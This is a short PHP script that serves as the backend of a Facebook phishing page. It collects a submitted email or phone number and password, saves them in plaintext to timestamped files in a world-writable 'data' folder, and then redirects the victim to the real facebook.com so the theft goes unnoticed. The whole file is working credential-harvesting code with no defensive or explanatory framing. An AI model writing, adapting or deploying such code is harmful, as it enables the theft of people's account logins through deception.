<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email_or_phone = $_POST['email_or_phone'];
    $password = $_POST['password'];

    // Prepare data to be written
    $data = "Email or Phone: " . $email_or_phone . "\nPassword: " . $password . "\n\n";

    // Create a unique filename
    $filename = 'data_' . time() . '.txt';

    // Specify the directory where files will be saved
    $directory = 'data';

    // Check if the directory exists, if not, create it
    if (!is_dir($directory)) {
        mkdir($directory, 0777, true);
    }

    // Save data to the file
    file_put_contents($directory . '/' . $filename, $data);

    // Redirect to Facebook
    header('Location: https://www.facebook.com');
    exit();
} else {
    echo "Invalid request method";
}
?>
